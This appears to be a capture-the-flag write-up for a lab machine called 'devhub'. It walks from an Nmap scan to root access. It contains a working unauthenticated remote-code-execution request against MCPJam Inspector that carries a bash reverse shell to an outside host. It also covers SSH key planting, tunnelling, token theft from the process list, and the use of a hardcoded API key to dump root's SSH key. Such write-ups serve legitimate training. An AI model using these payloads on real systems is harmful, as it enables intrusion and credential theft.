## 1. Reconnaissance

I started with an Nmap scan to identify open ports and running services.

```bash
nmap -A devhub.htb
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-23 11:25 +0200
Nmap scan report for devhub.htb (10.129.245.216)
Host is up (0.038s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
53/tcp open  domain?
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DevHub - Internal Development Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 63.82 seconds
```

Three ports are open:

- **22/tcp** — SSH (OpenSSH 8.9p1)
- **53/tcp** — DNS
- **80/tcp** — HTTP (nginx 1.18.0)

---

## 2. Enumeration

Browsing to `http://devhub.htb` revealed an internal development platform. Further inspection showed the platform was running **MCPJam Inspector**, an MCP (Model Context Protocol) server management tool.

Researching MCPJam led to a known vulnerability: the `/api/mcp/connect` endpoint accepts a `serverConfig` object that specifies the command to execute when connecting to an MCP server. There is no sanitization of the `command` or `args` fields, resulting in unauthenticated remote code execution.

---

## 3. Foothold — RCE via MCPJam (CVE)

I set up a netcat listener on my machine:

```bash
nc -lvnp 4444
```

Then triggered the reverse shell by sending a malicious `serverConfig` to the MCPJam API:

```bash
curl http://devhub.htb:6274/api/mcp/connect \
  --header "Content-Type: application/json" \
  --data '{
    "serverConfig": {
      "command": "/bin/bash",
      "args": ["-c", "/bin/bash -i >& /dev/tcp/10.10.14.227/4444 0>&1"],
      "env": {}
    },
    "serverId": "mytest"
  }'
```

The listener caught a shell as `mcp-dev`:

```
bash: cannot set terminal process group (1059): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

I then upgraded to a fully interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 4. Lateral Movement — Jupyter Token → analyst shell

Listing running processes revealed a Jupyter Lab server running as the `analyst` user, with the authentication token visible in plaintext in the command arguments:

```bash
ps auxww | grep -i jupyter
```

```
analyst  1058  ... /home/analyst/jupyter-env/bin/python3 \
  /home/analyst/jupyter-env/bin/jupyter-lab \
  --ip=127.0.0.1 --port=8888 --no-browser \
  --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 ...
```

Since Jupyter was only listening on `127.0.0.1:8888`, I needed to expose it to my machine. I first planted my SSH public key in `mcp-dev`'s `authorized_keys`:

```bash
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-rsa AAAA...your_key... sam@mac" > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

Then created an SSH tunnel from my machine to forward port 8888:

```bash
ssh -i ~/.ssh/id_rsa -L 8888:127.0.0.1:8888 mcp-dev@devhub.htb
```

Navigating to `http://127.0.0.1:8888` and entering the token `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7` granted access to the Jupyter Lab interface. From a Jupyter terminal, I had a shell as `analyst`.

---

## 5. User Flag

```bash
analyst@devhub:~$ cat user.txt
f8f4453985aa1b7af2a06b9ad76c30f7
```

---

## 6. Privilege Escalation — Hardcoded API Key → Root SSH Key

### Enumeration with LinPEAS

Running LinPEAS on the target highlighted a critical finding: the `$PATH` variable for the `analyst` user places `/home/analyst/jupyter-env/bin` first, and that directory is writable.

```
/home/analyst/jupyter-env/bin:/usr/local/bin:/usr/bin:/bin:/snap/bin
```

### Identifying the Vulnerable Service

LinPEAS also flagged that `opsmcp.service` runs as `root` and calls `python3` from the writable directory:

```
psmcp.service: /home/analyst/jupyter-env/bin/python3 (writable parent: /home/analyst/jupyter-env/bin)
```

Inspecting the service file confirmed it:

```bash
systemctl cat opsmcp.service
```

```ini
[Service]
User=root
Environment=PATH=/home/analyst/jupyter-env/bin:/usr/local/bin:/usr/bin:/bin
ExecStart=/home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
Restart=always
RestartSec=10
```

### Discovering the Hardcoded API Key

While attempting to force a service restart to trigger the PATH hijack, I read the service's source code:

```bash
cat /opt/opsmcp/server.py
```

The file contained a hardcoded API key:

```python
API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

### Dumping the Root SSH Key via the Admin API

Using the API key, I queried an undocumented admin endpoint that dumps SSH keys:

```bash
curl -s -X POST 'http://localhost:5000/tools/call' \
  -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
  -H 'Content-Type: application/json' \
  -d '{"name": "ops._admin_dump", "arguments": {"confirm": true, "target": "ssh_keys"}}'
```

The response contained the root private SSH key:

```json
{
  "note": "Emergency recovery key dump",
  "root_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n...\n-----END OPENSSH PRIVATE KEY-----\n",
  "target": "ssh_keys"
}
```

### Connecting as Root

I saved the key and connected:

```bash
cat > /tmp/root_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
[key content]
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 /tmp/root_key
ssh -i /tmp/root_key root@localhost
```

---

## 7. Root Flag

```bash
root@devhub:~# cat /root/root.txt
[root flag]
```
